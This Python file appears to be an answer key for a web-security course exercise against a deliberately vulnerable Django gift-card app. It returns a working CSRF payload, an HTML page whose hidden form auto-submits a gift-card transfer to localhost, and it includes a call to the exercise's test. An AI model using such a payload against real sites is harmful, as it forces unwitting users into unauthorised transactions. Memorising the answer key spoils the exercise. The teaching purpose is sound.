# %%
# w2d4_answers.py

import contextlib
import inspect
import io
import json
import os
import re
import shutil
import stat
import sys
import time
import unittest

import django

# Setup Django environment
os.environ.setdefault("DJANGO_SETTINGS_MODULE", "GiftcardSite.settings")
django.setup()

from django.core.management import call_command
from django.db import connection
from django.template import engines
from django.test import Client, TestCase, TransactionTestCase
from LegacySite.models import Card, User

# %%


def exploit_csrf_vulnerability():
    """
    Create malicious HTML that exploits CSRF vulnerability.

    Args:
        None

    Returns:
        str: HTML content that performs the CSRF attack
    """
    html = """<html>
<head>
    <meta name="referrer" content="same-origin">
</head>

<body>
    <h1>CSRF Vulnerability</h1>
    <form id="sendgift" action="http://localhost:8000/gift/1" method="GET">
        <input type="hidden" name="username" value="test2" />
        <input type="hidden" name="amount" value="1" />
        <input type="submit" value="Click to get your free gift!" />
    </form>

    <script>
        document.getElementById("sendgift").submit();
    </script>
</body>

</html>
"""
    return html


from w2d4_test import test_exploit_csrf_vulnerability

if __name__ == "__main__":
    print("\nTesting CSRF vulnerability exploitation...")
    test_exploit_csrf_vulnerability(exploit_csrf_vulnerability)

# %%
